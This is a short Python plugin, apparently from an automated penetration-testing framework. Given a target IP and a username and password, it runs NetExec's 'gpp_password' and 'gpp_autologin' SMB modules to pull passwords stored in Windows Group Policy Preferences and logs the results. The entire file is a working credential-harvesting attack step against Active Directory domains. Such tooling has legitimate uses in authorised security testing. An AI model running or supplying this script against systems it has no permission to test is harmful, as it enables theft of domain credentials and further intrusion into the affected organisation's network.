PROVIDES = []
REQUIRES = ["creds"]


def run(data, cred, args):

    import subprocess

    from core.paths import get_artifacts_dir

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    ip = data["ip"]
    target = data["name"]

    artifacts = get_artifacts_dir(target)

    modules = [
        (
            "GPP Passwords",
            "gpp_password",
            artifacts / "gpp_password.txt",
        ),
        (
            "GPP AutoLogon",
            "gpp_autologin",
            artifacts / "gpp_autologin.txt",
        ),
    ]

    for title, module, logfile in modules:

        cmd = [
            "nxc",
            "smb",
            ip,
            "-u",
            cred["user"],
            "-p",
            cred["secret"],
            "-M",
            module,
            "--log",
            str(logfile),
        ]

        print()

        print(
            f"{B}[*]{W} {title}"
        )

        print(
            f"{Y}{' '.join(cmd)}{W}\n"
        )

        subprocess.run(cmd)

        print()

        print(
            f"{G}[+] Log saved:{W} {logfile}"
        )

    print()

    print(
        f"{G}[+] GPP enumeration complete.{W}"
    )

    print()